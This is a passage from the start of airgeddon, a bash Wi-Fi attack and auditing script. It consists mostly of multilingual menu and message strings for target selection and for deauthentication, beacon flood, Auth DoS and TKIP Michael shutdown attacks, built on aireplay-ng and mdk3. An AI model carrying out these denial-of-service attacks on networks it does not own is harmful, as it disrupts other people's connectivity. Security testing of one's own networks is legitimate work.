#!/bin/bash

version="3.02"

#Change these lines to select another default language
language="english"
#language="spanish"
#language="french"
#language="catalan"

#General vars
urlgithub="https://github.com/v1s1t0r1sh3r3/airgeddon"
mail="v1s1t0r.1sh3r3@gmail.com"
essential_tools=(iwconfig awk airmon-ng airodump-ng aireplay-ng mdk3 wpaclean)
declare -A lang_association=(["en"]="english" ["es"]="spanish" ["fr"]="french" ["ca"]="catalan")
standardhandshake_filename="handshake-01.cap"
tmpdir="/tmp/"
tmpfiles_toclean=0

#Distro vars
known_compatible_distros=("wifislax" "kali" "parrot" "backbox" "blackarch")
known_working_nondirectly_compatible_distros=("ubuntu" "debian")

#Hint vars
declare main_hints=(128 134 163)
declare dos_hints=(129 131 133)
declare handshake_hints=(127 130 132 136)
declare handshake_attack_hints=(142)

#Colors
green_color="\033[1;32m"
red_color="\033[1;31m"
blue_color="\033[1;34m"
yellow_color="\033[1;33m"
pink_color="\033[1;35m"
normal_color="\e[1;0m"

function language_strings() {

	declare -A hintprefix
	hintprefix["english"]="Hint"
	hintprefix["spanish"]="Consejo"
	hintprefix["french"]="Conseil"
	hintprefix["catalan"]="Consell"

	declare -A arr
	arr["english",0]="This interface $interface is already in managed mode"
	arr["spanish",0]="Esta interfaz $interface ya está en modo managed"
	arr["french",0]="L'interface $interface est déjà en mode managed"
	arr["catalan",0]="Aquesta interfície $interface ja està en mode managed"

	arr["english",1]="This interface $interface is not a wifi card. It doesn't support managed mode"
	arr["spanish",1]="Esta interfaz $interface no es una tarjeta wifi. No soporta modo managed"
	arr["french",1]="L'interface $interface n'est pas une carte wifi. Elle n'est donc pas compatible mode managed"
	arr["catalan",1]="Aquesta interfície $interface no és una targeta wifi vàlida. No es compatible amb mode managed"

	arr["english",2]="English O.S. language detected. Supported by script. Automatically changed"
	arr["spanish",2]="Idioma Español del S.O. detectado. Soportado por el script. Se cambió automaticamente"
	arr["french",2]="Langue Française de O.S. détectée. Pris en charge par le script. Changé automatiquement"
	arr["catalan",2]="Idioma Català del S.O. detectat. Suportat pel script. S'ha canviat automàticament"

	arr["english",3]="Select target network :"
	arr["spanish",3]="Selecciona la red objetivo :"
	arr["french",3]="Sélectionnez le réseau cible :"
	arr["catalan",3]="Selecciona la xarxa objectiu :"

	arr["english",4]="Press [Enter] key to start attack..."
	arr["spanish",4]="Pulse la tecla [Enter] para comenzar el ataque..."
	arr["french",4]="Pressez [Enter] pour commencer l'attaque..."
	arr["catalan",4]="Premi la tecla [Enter] per començar l'atac..."

	arr["english",5]="No 100% compatible distro detected"
	arr["spanish",5]="No se ha detectado una distro compatible 100%"
	arr["french",5]="La distro détectée n'est pas compatible 100%"
	arr["catalan",5]="La distro detectada no es compatible 100%"

	arr["english",6]="Welcome to airgeddon script v$version"
	arr["spanish",6]="Bienvenid@ al airgeddon script v$version"
	arr["french",6]="Bienvenue au script airgeddon v$version"
	arr["catalan",6]="Benvingut al airgeddon script v$version"

	arr["english",7]="This script is only for educational purposes. Be good boyz&girlz"
	arr["spanish",7]="Este script se ha hecho sólo con fines educativos. Sed buen@s chic@s"
	arr["french",7]="Ce script a été fait à des fins purement éducatives. Portez-vous biens!"
	arr["catalan",7]="Aquest script s'ha fet només amb fins educatius. Porteu-vos bé!"

	arr["english",8]="Known 100% compatible distros with this script :"
	arr["spanish",8]="Distros conocidas 100% compatibles con este script :"
	arr["french",8]="Distros connus 100% compatibles avec ce script :"
	arr["catalan",8]="Distros conegudes 100% compatibles amb aquest script :"

	arr["english",9]="Detecting distro..."
	arr["spanish",9]="Detectando distro..."
	arr["french",9]="Détection de la distro..."
	arr["catalan",9]="Detecció de la distro..."

	arr["english",10]="This interface $interface is already in monitor mode"
	arr["spanish",10]="Esta interfaz $interface ya está en modo monitor"
	arr["french",10]="L'interface $interface est déjà en mode moniteur"
	arr["catalan",10]="Aquesta interfície ja està en mode monitor"

	arr["english",11]="Exiting airgeddon script v$version - See you soon! :)"
	arr["spanish",11]="Saliendo de airgeddon script v$version - Nos vemos pronto! :)"
	arr["french",11]="Fermeture du script airgeddon v$version - A bientôt! :)"
	arr["catalan",11]="Sortint de airgeddon script v$version - Ens veiem aviat! :)"

	arr["english",12]="Please, exit properly using menu option"
	arr["spanish",12]="Por favor, sal del script correctamente utilizando la opción del menú"
	arr["french",12]="S'il vous plaît, veuillez utiliser l'option du menue pour arrêter corectement le script"
	arr["catalan",12]="Si us plau, utilitzeu l'opció del menu per sortir correctament del script"

	arr["english",13]="This interface $interface is not a wifi card. It doesn't support monitor mode"
	arr["spanish",13]="Esta interfaz $interface no es una tarjeta wifi. No soporta modo monitor"
	arr["french",13]="L'interface $interface n'est pas une carte wifi. Elle n'est donc pas compatible mode moniteur"
	arr["catalan",13]="Aquesta interfície $interface no és una targeta wifi vàlida. No es compatible amb mode monitor"

	arr["english",14]="This interface $interface is not in monitor mode"
	arr["spanish",14]="Esta interfaz $interface no está en modo monitor"
	arr["french",14]="L'interface $interface n'est pas en mode moniteur"
	arr["catalan",14]="Aquesta interfície $interface no està en mode monitor" 

	arr["english",15]="The interface changed its name while putting in managed mode. Autoselected"
	arr["spanish",15]="Esta interfaz ha cambiado su nombre al ponerlo en modo managed. Se ha seleccionado automáticamente"
	arr["french",15]="Le nom de l'interface a changé lors du passage en mode managed. Elle a été sélectionnée automatiquement"
	arr["catalan",15]="Aquesta interfície ha canviat de nom al posar-la en mode managed. S'ha triat automàticament"

	arr["english",16]="Managed mode now is set on $interface"
	arr["spanish",16]="Se ha puesto el modo managed en $interface"
	arr["french",16]="$interface est maintenant en mode manged"
	arr["catalan",16]="$interface s'ha configurat en mode managed" 

	arr["english",17]="Putting your interface in managed mode..."
	arr["spanish",17]="Poniendo la interfaz en modo managed..."
	arr["french",17]="L'interface est en train de passer en mode managed..."
	arr["catalan",17]="Configurant la interfície en mode managed..."

	arr["english",18]="Putting your interface in monitor mode..."
	arr["spanish",18]="Poniendo la interfaz en modo monitor..."
	arr["french",18]="L'interface est en train de passer en mode moniteur..."
	arr["catalan",18]="Configurant la interfície en mode monitor..."

	arr["english",19]="Please be patient. Maybe killing some conflicting processes..."
	arr["spanish",19]="Por favor ten paciencia. Puede que esté matando algunos procesos que podrían causar conflicto..."
	arr["french",19]="Soyez patients s'il vous plaît. Il se peut qu'il faile tuer des processus conflictuels..."
	arr["catalan",19]="Si us plau té paciència. Pot ser que s'estiguin matant alguns processos que podrien causar conflicte..."

	arr["english",20]="This interface $interface doesn't support monitor mode"
	arr["spanish",20]="Esta interfaz $interface no soporta modo monitor"
	arr["french",20]="L'interface $interface n'est pas compatible mode moniteur"
	arr["catalan",20]="Aquesta interfície $interface no suporta mode monitor" 

	arr["english",21]="The interface changed its name while putting in monitor mode. Autoselected"
	arr["spanish",21]="Esta interfaz ha cambiado su nombre al ponerla en modo monitor. Se ha seleccionado automáticamente"
	arr["french",21]="Le nom de l'interface à changé lors de l'activation du mode moniteur. Elle a été automatiquement sélectionnée"
	arr["catalan",21]="Aquesta interfície ha canviat de nom al posar-la en mode monitor. S'ha seleccionat automàticament"

	arr["english",22]="Monitor mode now is set on $interface"
	arr["spanish",22]="Se ha puesto el modo monitor en $interface"
	arr["french",22]="Mode moniteur activé sur l'interface $interface"
	arr["catalan",22]="S'ha configurat el mode monitor en $interface"

	arr["english",23]="There is a problem with the interface selected. Redirecting you to script exit"
	arr["spanish",23]="Hay un problema con la interfaz seleccionada. Redirigiendo a la salida del script"
	arr["french",23]="Il y a un problème avec l'interface choisie. Vous allez être dirigés vers la sortie du script"
	arr["catalan",23]="Hi ha un problema amb la interfície seleccionada. Redirigint cap a la sortida del script"

	arr["english",24]="Select an interface to work with :"
	arr["spanish",24]="Selecciona una interfaz para trabajar con ella :"
	arr["french",24]="Sélectionnez l'interface pour travailler :"
	arr["catalan",24]="Seleccionar una interfície per treballar-hi :"

	arr["english",25]="Set channel (1-14) :"
	arr["spanish",25]="Selecciona un canal (1-14) :"
	arr["french",25]="Sélectionnez un canal (1-14) :"
	arr["catalan",25]="Seleccioni un canal (1-14) :"

	arr["english",26]="Channel set to $channel"
	arr["spanish",26]="Canal elegido $channel"
	arr["french",26]="Le canal $channel a été choisi"
	arr["catalan",26]="El canal $channel s'ha escollit"

	arr["english",27]="Type target BSSID (example: 00:11:22:33:44:55) :"
	arr["spanish",27]="Escribe el BSSID objetivo (ejemplo: 00:11:22:33:44:55) :"
	arr["french",27]="Veuillez entrer le BSSID de l'objectif (exemple: 00:11:22:33:44:55) :"
	arr["catalan",27]="Escriu el BSSID objectiu (exemple 00:11:22:33:44:55) :"

	arr["english",28]="BSSID set to $bssid"
	arr["spanish",28]="BSSID elegido $bssid"
	arr["french",28]="Le BSSID choisi est $bssid"
	arr["catalan",28]="El BSSID escollit $bssid"

	arr["english",29]="Type target ESSID :"
	arr["spanish",29]="Escribe el ESSID objetivo :"
	arr["french",29]="Écrivez l'ESSID du réseau cible :"
	arr["catalan",29]="Escriu el ESSID objectiu :"

	arr["english",30]="You have selected a hidden network ESSID. Can't be used. Select another one or perform a BSSID based attack instead of this"
	arr["spanish",30]="Has seleccionado un ESSID de red oculta. No se puede usar. Selecciona otro o ejecuta un ataque basado en BSSID en lugar de este"
	arr["french",30]="Vous avez choisi un réseau dont l'ESSID est caché et ce n'est pas possible. Veuillez sélectionner une autre cible ou bien effectuer une attaque qui se fonde sur le BSSID au lieu de celle-ci"
	arr["catalan",30]="Has seleccionat un ESSID de xarxa oculta. No es pot utilitzar. Selecciona un altre o executa un atac basat en BSSID en lloc d'aquest"

	arr["english",31]="ESSID set to $essid"
	arr["spanish",31]="ESSID elegido $essid"
	arr["french",31]="l'ESSID sélectionné est $essid"
	arr["catalan",31]="l'ESSID seleccionat $essid"

	arr["english",32]="All parameters set"
	arr["spanish",32]="Todos los parámetros están listos"
	arr["french",32]="Tous les paramètres sont correctement établis"
	arr["catalan",32]="Tots els paràmetres establerts"

	arr["english",33]="Starting attack. When started, press Ctrl+C to stop..."
	arr["spanish",33]="Comenzando ataque. Una vez empezado, pulse Ctrl+C para pararlo..."
	arr["french",33]="L'attaque est lancé. Pressez Ctrl+C pour l'arrêter..."
	arr["catalan",33]="Començant l'atac. Un cop començat, premeu Ctrl+C per aturar-lo..."

	arr["english",34]="Selected interface $interface is in monitor mode. Attack can be performed"
	arr["spanish",34]="La interfaz seleccionado $interface está en modo monitor. El ataque se puede realizar"
	arr["french",34]="L'interface $interface qui a été sélectionnée est bien en mode moniteur. L'attaque peut être lancée"
	arr["catalan",34]="La interfície seleccionada $interface està configurada en mode monitor. L'atac es pot realitzar"

	arr["english",35]="Deauthentication / Dissasociation mdk3 attack chosen (monitor mode needed)"
	arr["spanish",35]="Elegido ataque de Desautenticación / Desasociación mdk3 (modo monitor requerido)"
	arr["french",35]="L'attaque de Dés-authentification / Dissociation mdk3 a été choisie (mode moniteur nécessaire)"
	arr["catalan",35]="Seleccionat atac de Desautenticació / Dissociació mdk3 (es requereix mode monitor)"

	arr["english",36]="Deauthentication aireplay attack chosen (monitor mode needed)"
	arr["spanish",36]="Elegido ataque de Desautenticación aireplay (modo monitor requerido)"
	arr["french",36]="L'attaque de Dés-authentification aireplay a été choisie (mode moniteur nécessaire)"
	arr["catalan",36]="Seleccionat atac de Desautenticació aireplay (es requereix mode monitor)"

	arr["english",37]="WIDS / WIPS / WDS Confusion attack chosen (monitor mode needed)"
	arr["spanish",37]="Elegido ataque Confusion WIDS / WIPS / WDS (modo monitor requerido)"
	arr["french",37]="L'attaque Confusion WIDS / WIPS / WDS a été choisie (mode moniteur nécessaire)"
	arr["catalan",37]="Seleccionat atac Confusion WIDS /WIPS / WDS (es requereix mode monitor)"

	arr["english",38]="Beacon flood attack chosen (monitor mode needed)"
	arr["spanish",38]="Elegido ataque Beacon flood (modo monitor requerido)"
	arr["french",38]="L'attaque Beacon flood a été choisie (mode moniteur nécessaire)"
	arr["catalan",38]="Seleccionat atac Beacon flood (es requereix mode monitor)"

	arr["english",39]="Auth DoS attack chosen (monitor mode needed)"
	arr["spanish",39]="Elegido ataque Auth DoS (modo monitor requerido)"
	arr["french",39]="L'attaque Auth DoS a été choisie (modo moniteur nécessaire)"
	arr["catalan",39]="Seleccionat atac Auth DoS (es requereix mode monitor)"

	arr["english",40]="Michael Shutdown (TKIP) attack chosen (monitor mode needed)"
	arr["spanish",40]="Elegido ataque Michael Shutdown (TKIP) (modo monitor requerido)"
	arr["french",40]="L'attaque Michael Shutdown (TKIP) a été choisie (mode moniteur nécessaire)"
	arr["catalan",40]="Seleccionat atac Michael Shutdown (TKIP) (es requereix mode monitor)"

	arr["english",41]="No interface selected. You'll be redirected to select one"
	arr["spanish",41]="No hay interfaz seleccionada. Serás redirigido para seleccionar una"
	arr["french",41]="Aucune interface sélectionnée. Vous allez retourner au menu de sélection pour en choisir une"
	arr["catalan",41]="No hi ha intefície seleccionada. Seràs redirigit per seleccionar una"

	arr["english",42]="Interface "${pink_color}"$interface"${blue_color}" selected. Mode: "${pink_color}"$ifacemode"${normal_color}
	arr["spanish",42]="Interfaz "${pink_color}"$interface"${blue_color}" seleccionada. Modo: "${pink_color}"$ifacemode"${normal_color}
	arr["french",42]="Interface "${pink_color}"$interface"${blue_color}" sélectionnée. Mode: "${pink_color}"$ifacemode"${normal_color}
	arr["catalan",42]="Interfície "${pink_color}"$interface"${blue_color}" seleccionada. Mode: "${pink_color}"$ifacemode"${normal_color}

	arr["english",43]="Selected BSSID: "${pink_color}"$bssid"${normal_color}
	arr["spanish",43]="BSSID seleccionado: "${pink_color}"$bssid"${normal_color}
	arr["french",43]="BSSID sélectionné: "${pink_color}"$bssid"${normal_color}
	arr["catalan",43]="BSSID seleccionat: "${pink_color}"$bssid"${normal_color}

	arr["english",44]="Selected channel: "${pink_color}"$channel"${normal_color}
	arr["spanish",44]="Canal seleccionado: "${pink_color}"$channel"${normal_color}
	arr["french",44]="Canal sélectionné: "${pink_color}"$channel"${normal_color}
	arr["catalan",44]="Canal seleecionat: "${pink_color}"$channel"${normal_color}

	arr["english",45]="Selected ESSID: "${pink_color}"$essid"${blue_color}" <- can't be used"
	arr["spanish",45]="ESSID seleccionado: "${pink_color}"$essid"${blue_color}" <- no se puede usar"
	arr["french",45]="ESSID sélectionné: "${pink_color}"$essid"${blue_color}" <- ne peut pas être utilisé"
	arr["catalan",45]="ESSID seleccionat: "${pink_color}"$essid"${blue_color}" <- no es pot utilitzar"

	arr["english",46]="Selected ESSID: "${pink_color}"$essid"${normal_color}
	arr["spanish",46]="ESSID seleccionado: "${pink_color}"$essid"${normal_color}
	arr["french",46]="ESSID sélectionné: "${pink_color}"$essid"${normal_color}
	arr["catalan",46]="ESSID seleccionat: "${pink_color}"$essid"${normal_color}

	arr["english",47]="Select an option from menu :"
	arr["spanish",47]="Selecciona una opción del menú :"
	arr["french",47]="Choisissez une des options du menu :"
	arr["catalan",47]="Selecciona una opció del menú :"

	arr["english",48]="1.  Select another network interface"
	arr["spanish",48]="1.  Selecciona otra interfaz de red"
	arr["french",48]="1.  Sélectionnez une autre interface réseaux"
	arr["catalan",48]="1.  Selecciona una altre interfície de xarxa"

	arr["english",49]="4.  Explore for targets (monitor mode needed)"
	arr["spanish",49]="4.  Explorar para buscar objetivos (modo monitor requerido)"
	arr["french",49]="4.  Détection des réseaux pour choisir une cible (modo moniteur obligatoire)"
	arr["catalan",49]="4.  Explorar per buscar objectius (es requereix mode monitor)"

	arr["english",50]="----------(monitor mode needed for attacks)----------"
	arr["spanish",50]="---------(modo monitor requerido en ataques)---------"
	arr["french",50]="----(modo moniteur obligatoire pour ces attaques)----"
	arr["catalan",50]="----------(mode monitor requerit per atacs)----------"

	arr["english",51]="5.  Deauth / disassoc amok mdk3 attack"
	arr["spanish",51]="5.  Ataque Deauth / Disassoc amok mdk3"
	arr["french",51]="5.  Attaque Deauth / Disassoc amok mdk3"
	arr["catalan",51]="5.  Atac Death /Disassoc amok mdk3"

	arr["english",52]="6.  Deauth aireplay attack"
	arr["spanish",52]="6.  Ataque Deauth aireplay"
	arr["french",52]="6.  Attaque Deauth aireplay"
	arr["catalan",52]="6.  Atac Deauth aireplay"

	arr["english",53]="7.  WIDS / WIPS / WDS Confusion attack"
	arr["spanish",53]="7.  Ataque WIDS / WIPS / WDS Confusion"
	arr["french",53]="7.  Attaque WIDS / WIPS / WDS Confusion"
	arr["catalan",53]="7.  Atac WIDS / WIPS / WDS Confusion"

	arr["english",54]="-----(Old \"obsolete/non very effective\" attacks)-----"
	arr["spanish",54]="---(Antiguos ataques \"obsoletos/no muy efectivos\")---"
	arr["french",54]="----(Anciennes attaques \"obsolètes/peu efficaces\")---"
	arr["catalan",54]="-----(Antics atacs \"obsolets/no gaire efectius\")-----"

	arr["english",55]="2.  Put interface in monitor mode"
	arr["spanish",55]="2.  Poner la interfaz en modo monitor"
	arr["french",55]="2.  Passer l'interface en mode moniteur"
	arr["catalan",55]="2.  Configurar la interfície en mode monitor"

	arr["english",56]="3.  Put interface in managed mode"
	arr["spanish",56]="3.  Poner la interfaz en modo managed"
	arr["french",56]="3.  Passer l'interface en mode managed"
	arr["catalan",56]="3.  Configurar la interfície en mode managed"

	arr["english",57]="6.  Put interface in monitor mode"
	arr["spanish",57]="6.  Poner el interfaz en modo monitor"
	arr["french",57]="6.  Passer l'interface en mode moniteur"
	arr["catalan",57]="6.  Configurar la interfície en mode monitor"

	arr["english",58]="7.  Put interface in managed mode"
	arr["spanish",58]="7.  Poner el interfaz en modo managed"
	arr["french",58]="7.  Passer l'interface en mode managed"
	arr["catalan",58]="7.  Configurar la interfície en mode managed"

	arr["english",59]="11. Return to main menu"
	arr["spanish",59]="11. Volver al menú principal"
	arr["french",59]="11. Retourner au menu principal"
	arr["catalan",59]="11. Tornar al menú principal"

	arr["english",60]="6.  About & Credits"
	arr["spanish",60]="6.  Acerca de & Créditos"
	arr["french",60]="6.  A propos de & Crédits"
	arr["catalan",60]="6.  Sobre & Crédits"

	arr["english",61]="8.  Exit script"
	arr["spanish",61]="8.  Salir del script"
	arr["french",61]="8.  Sortir du script"
	arr["catalan",61]="8.  Sortir del script"

	arr["english",62]="8.  Beacon flood attack"
	arr["spanish",62]="8.  Ataque Beacon flood"
	arr["french",62]="8.  Attaque Beacon flood"
	arr["catalan",62]="8.  Atac Beacon flood"

	arr["english",63]="9.  Auth DoS attack"
	arr["spanish",63]="9.  Ataque Auth DoS"
	arr["french",63]="9.  Attaque Auth DoS"
	arr["catalan",63]="9.  Atac Auth Dos"

	arr["english",64]="10. Michael shutdown exploitation (TKIP) attack"
	arr["spanish",64]="10. Ataque Michael shutdown exploitation (TKIP)"
	arr["french",64]="10. Attaque Michael shutdown exploitation (TKIP)"
	arr["catalan",64]="10. Atac Michael shutdown exploitation (TKIP)"

	arr["english",65]="Exploring for targets option chosen (monitor mode needed)"
	arr["spanish",65]="Elegida opción de exploración para buscar objetivos (modo monitor requerido)"
	arr["french",65]="L'option analyser choisi de rechercher des objectifs a été choisie (modo moniteur nécessaire)"
	arr["catalan",65]="Seleccionada opció d'exploració per buscar objectius (requerit mode monitor)"

	arr["english",66]="Selected interface $interface is in monitor mode. Exploration can be performed"
	arr["spanish",66]="La interfaz seleccionada $interface está en modo monitor. La exploración se puede realizar"
	arr["french",66]="L'interface choisie $interface est en mode moniteur. L'exploration des réseaux environnants peut s'effectuer"
	arr["catalan",66]="La interfície seleccionada $interface està en mode monitor. L'exploració es pot realitzar"

	arr["english",67]="When started, press Ctrl+C to stop..."
	arr["spanish",67]="Una vez empezado, pulse Ctrl+C para pararlo..."
	arr["french",67]="Une foi l'opération lancée, veuillez presser Ctrl+C pour l'arrêter..."
	arr["catalan",67]="Una vegada iniciat, polsi Ctrl+C per detenir-ho..."

	arr["english",68]="No networks found"
	arr["spanish",68]="No se encontraron redes"
	arr["french",68]="Aucun réseau détecté"
	arr["catalan",68]="No s'han trobat xarxes"

	arr["english",69]="  N.         BSSID      CHANNEL  PWR   ENC    ESSID"
	arr["spanish",69]="  N.         BSSID        CANAL  PWR   ENC    ESSID"
	arr["french",69]="  N.         BSSID        CANAL  PWR   ENC    ESSID"
	arr["catalan",69]="  N.         BSSID        CANAL  PWR   ENC    ESSID"

	arr["english",70]="Only one target detected. Autoselected"
	arr["spanish",70]="Sólo un objetivo detectado. Se ha seleccionado automáticamente"
	arr["french",70]="Un seul réseau a été détecté. Il a été automatiquement sélectionné"
	arr["catalan",70]="Només un objectiu detectat. Seleccionat automàticament"

	arr["english",71]="(*) Network with clients"
	arr["spanish",71]="(*) Red con clientes"
	arr["french",71]="(*) Réseau avec clients"
	arr["catalan",71]="(*) Xarxa amb clients"

	arr["english",72]="Invalid target network was chosen"
	arr["spanish",72]="Red objetivo elegida no válida"
	arr["french",72]="Le choix du réseau cible est invalide"
	arr["catalan",72]="Xarxa de destí seleccionada no vàlida"

	arr["english",73]="airgeddon script v$version developed by :"
	arr["spanish",73]="airgeddon script v$version programado por :"
	arr["french",73]="Le script airgeddon v$version a été programmé par :"
	arr["catalan",73]="airgeddon script v$version desenvolupat per :"

	arr["english",74]="This script is under GPLv2 (or later) License"
	arr["spanish",74]="Este script está bajo Licencia GPLv2 (o posterior)"
	arr["french",74]="Script publié sous Licence GPLv2 (ou version supèrieure)"
	arr["catalan",74]="Aquest script està publicat sota llicència GPLv2 (o versió superior)"

	arr["english",75]="Thanks to the \"Spanish pen testing crew\" and \"Wifislax Staff\" for beta testing and support received"
	arr["spanish",75]="Gracias al \"Spanish pen testing crew\" y al \"Wifislax Staff\" por el beta testing y el apoyo recibido"
	arr["french",75]="Merci au \"Spanish pen testing crew\" et au \"Wifislax Staff\" pour les tests en phase bêta et leur soutien"
	arr["catalan",75]="Gràcies al \"Spanish pen testing crew\" i al \"Wifislax Staff\" per les proves beta i el recolzament rebut"

	arr["english",76]="Invalid menu option was chosen"
	arr["spanish",76]="Opción del menú no válida"
	arr["french",76]="Option erronée"
	arr["catalan",76]="Opció del menú no vàlida"

	arr["english",77]="Invalid interface was chosen"
	arr["spanish",77]="Interfaz no válida"
	arr["french",77]="L'interface choisie n'existe pas"
	arr["catalan",77]="Interfície no vàlida"

	arr["english",78]="7.  Change language"
	arr["spanish",78]="7.  Cambiar idioma"
	arr["french",78]="7.  Changer de langue"
	arr["catalan",78]="7.  Canviar l'idioma"

	arr["english",79]="1.  English"
	arr["spanish",79]="1.  Inglés"
	arr["french",79]="1.  Anglais"
	arr["catalan",79]="1.  Anglés"

	arr["english",80]="2.  Spanish"
	arr["spanish",80]="2.  Español"
	arr["french",80]="2.  Espagnol"
	arr["catalan",80]="2.  Espanyol"

	arr["english",81]="Select a language :"
	arr["spanish",81]="Selecciona un idioma :"
	arr["french",81]="Choisissez une langue :"
	arr["catalan",81]="Selecciona un idioma :"

	arr["english",82]="Invalid language was chosen"
	arr["spanish",82]="Idioma no válido"
	arr["french",82]="Langue non valide"
	arr["catalan",82]="Idioma no vàlid"

	arr["english",83]="Language changed to English"
	arr["spanish",83]="Idioma cambiado a Inglés"
	arr["french",83]="Le script sera maintenant en Anglais"
	arr["catalan",83]="Idioma canviat a Anglés"

	arr["english",84]="Language changed to Spanish"
	arr["spanish",84]="Idioma cambiado a Español"
	arr["french",84]="Le script sera maintenant en Espagnol"
	arr["catalan",84]="Idioma canviat a Espanyol"

	arr["english",85]="Send me bugs or suggestions to $mail"
	arr["spanish",85]="Enviadme errores o sugerencias a $mail"
	arr["french",85]="Envoyer des erreurs ou des suggestions à $mail"
	arr["catalan",85]="Envieu-me errorrs o suggeriments a $mail"

	arr["english",86]="Welcome"
	arr["spanish",86]="Bienvenid@"
	arr["french",86]="Bienvenue"
	arr["catalan",86]="Benvingut"

	arr["english",87]="Change language"
	arr["spanish",87]="Cambiar idioma"
	arr["french",87]="Changer de langue"
	arr["catalan",87]="Canviar d'idioma"

	arr["english",88]="Interface selection"
	arr["spanish",88]="Selección de interfaz"
	arr["french",88]="Sélection de l'interface"
	arr["catalan",88]="Selecció de interfície"

	arr["english",89]="Mdk3 amok action"
	arr["spanish",89]="Acción mdk3 amok"
	arr["french",89]="Action mdk3 amok"
	arr["catalan",89]="Acció mdk3 amok"

	arr["english",90]="Aireplay deauth action"
	arr["spanish",90]="Acción aireplay deauth"
	arr["french",90]="Action aireplay deauth"
	arr["catalan",90]="Acció aireplay deauth"

	arr["english",91]="WIDS / WIPS / WDS confusion action"
	arr["spanish",91]="Acción WIDS / WIPS / WDS confusion"
	arr["french",91]="Action WIDS / WIPS / WDS confusion"
	arr["catalan",91]="Acció WIDS / WIPS / WDS confusion"

	arr["english",92]="Beacon flood action"
	arr["spanish",92]="Acción Beacon flood"
	arr["french",92]="Action Beacon flood"
	arr["catalan",92]="Acció Beacon flood"

	arr["english",93]="Auth DoS action"
	arr["spanish",93]="Acción Auth DoS"
	arr["french",93]="Action Auth DoS"
	arr["catalan",93]="Acció Auth DoS"

	arr["english",94]="Michael Shutdown action"
	arr["spanish",94]="Acción Michael Shutdown"
	arr["french",94]="Action Michael Shutdown"
	arr["catalan",94]="Acció Michael Shutdown"

	arr["english",95]="Mdk3 amok parameters"
	arr["spanish",95]="Parámetros Mdk3 amok"
	arr["french",95]="Paramètres Mdk3 amok"
	arr["catalan",95]="Paràmetres Mdk3 amok"

	arr["english",96]="Aireplay deauth parameters"
	arr["spanish",96]="Parámetros Aireplay deauth"
	arr["french",96]="Paramètres Aireplay deauth"
	arr["catalan",96]="Paràmetres Aireplay deauth"

	arr["english",97]="WIDS / WIPS / WDS parameters"
	arr["spanish",97]="Parámetros WIDS / WIPS / WDS"
	arr["french",97]="Paramètres WIDS / WIPS / WDS"
	arr["catalan",97]="Paràmetres WIDS / WIPS / WDS"

	arr["english",98]="Beacon flood parameters"
	arr["spanish",98]="Parámetros Beacon flood"
	arr["french",98]="Paramètres Beacon flood"
	arr["catalan",98]="Paràmetres Beacon flood"

	arr["english",99]="Auth DoS parameters"
	arr["spanish",99]="Parámetros Auth DoS"
	arr["french",99]="Paramètres Auth DoS"
	arr["catalan",99]="Paràmetres Auth DoS"

	arr["english",100]="Michael Shutdown parameters"
	arr["spanish",100]="Parámetros Michael Shutdown"
	arr["french",100]="Paramètres Michael Shutdown"
	arr["catalan",100]="Paràmetres Michael Shutdown"

	arr["english",101]="Airgeddon main menu"
	arr["spanish",101]="Menú principal airgeddon"
	arr["french",101]="Menu principal d'airgeddon"
	arr["catalan",101]="Menú principal airgeddon"

	arr["english",102]="DoS attacks menu"
	arr["spanish",102]="Menú ataques DoS"
	arr["french",102]="Menu des attaques DoS"
	arr["catalan",102]="Menú d'atacs DoS"

	arr["english",103]="Exploring for targets"
	arr["spanish",103]="Explorar para buscar objetivos"
	arr["french",103]="Détection pour trouver des cibles"
	arr["catalan",103]="Explorar per buscar objectius"

	arr["english",104]="Select target"
	arr["spanish",104]="Seleccionar objetivo"
	arr["french",104]="Selection de l'objectif"
	arr["catalan",104]="Seleccionar objectiu"

	arr["english",105]="About & Credits"
	arr["spanish",105]="Acerca de & Créditos"
	arr["french",105]="A propos de & Crédits"
	arr["catalan",105]="Sobre de & Crédits"

	arr["english",106]="Exiting"
	arr["spanish",106]="Saliendo"
	arr["french",106]="Sortie du script"
	arr["catalan",106]="Sortint"

	arr["english",107]="Join the project at $urlgithub"
	arr["spanish",107]="Únete al proyecto en $urlgithub"
	arr["french",107]="Rejoignez le projet : $urlgithub"
	arr["catalan",107]="Uneix-te al projecte a $urlgithub"

	arr["english",108]="Let's check if you have installed what script needs"
	arr["spanish",108]="Vamos a chequear si tienes instalado lo que el script usa"
	arr["french",108]="Nous allons vérifier si les dépendances sont bien installées"
	arr["catalan",108]="Anem a verificar si tens instal·lat el que l'script requereix"

	arr["english",109]="Checking..."
	arr["spanish",109]="Comprobando..."
	arr["french",109]="Vérification..."
	arr["catalan",109]="Comprovant..."

	arr["english",110]="Your distro is compatible. Script can continue..."
	arr["spanish",110]="Tu distro es compatible. El script puede continuar..."
	arr["french",110]="Votre distribution est compatible. Le script peut continuer..."
	arr["catalan",110]="La teva distro es compatible. L'script pot continuar..."

	arr["english",111]="You need to install some tools before running this script"
	arr["spanish",111]="Necesitas instalar algunas herramientas antes de lanzar este script"
	arr["french",111]="Vous devez installer quelques programmes avant de pouvoir lancer ce script"
	arr["catalan",111]="Necessites instal·lar algunes eines abans d'executar aquest script"

	arr["english",112]="Language changed to French"
	arr["spanish",112]="Idioma cambiado a Francés"
	arr["french",112]="Le script sera maintenant en Français"
	arr["catalan",112]="Llenguatge canviat a Francès"

	arr["english",113]="3.  French"
	arr["spanish",113]="3.  Francés"
	arr["french",113]="3.  Français"
	arr["catalan",113]="3.  Francès"

	arr["english",114]="Use it only on your own networks!!"
	arr["spanish",114]="Utilízalo solo en tus propias redes!!"
	arr["french",114]="Utilisez-le seulement dans vos propres réseaux!!"
	arr["catalan",114]="Utilitza'l només a les teves pròpies xarxes!!"

	arr["english",115]="Press [Enter] key to continue..."
	arr["spanish",115]="Pulsa la tecla [Enter] para continuar..."
	arr["french",115]="Pressez [Enter] pour continuer..."
	arr["catalan",115]="Prem la tecla [Enter] per continuar..."

	arr["english",116]="4.  Catalan"
	arr["spanish",116]="4.  Catalán"
	arr["french",116]="4.  Catalan"
	arr["catalan",116]="4.  Català"

	arr["english",117]="Language changed to Catalan"
	arr["spanish",117]="Idioma cambiado a Catalán"
	arr["french",117]="Le script sera maintenant en Catalan"
	arr["catalan",117]="Idioma canviat a Català"

	arr["english",118]="4.  DoS attacks menu"
	arr["spanish",118]="4.  Menú de ataques DoS"
	arr["french",118]="4.  Menu des attaques DoS"
	arr["catalan",118]="4.  Menú d'atacs DoS"

	arr["english",119]="5.  Handshake tools menu"
	arr["spanish",119]="5.  Menú de herramientas Handshake"
